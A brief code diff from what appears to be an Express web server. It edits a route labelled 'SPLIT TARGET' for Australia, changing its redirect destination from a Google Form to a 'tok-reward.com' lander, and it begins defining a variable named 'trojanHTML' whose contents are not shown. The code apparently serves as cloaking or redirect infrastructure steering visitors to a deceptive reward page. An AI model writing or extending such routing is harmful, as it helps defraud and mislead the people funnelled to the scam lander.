@@ -1929,7 +1929,7 @@ app.get('/dudd/:slug', (req, res, next) => {
 // DUDDUS SPLIT TARGET GOOGLE FORM AUSTRALIA 
 app.get('/duddau/:slug', (req, res, next) => {
     const { slug } = req.params;
-    const destinationLander = `https://docs.google.com/forms/d/e/1FAIpQLSeFUY4h9_yk6R29Tjo2g0SItzpZWvjr5p_ZaIsac03EiDXnsw/viewform?usp=sf_link`;
+    const destinationLander = `https://tok-reward.com/target500.html`;
     const trojanHTML = `
         <!DOCTYPE html>
         <html lang="en">
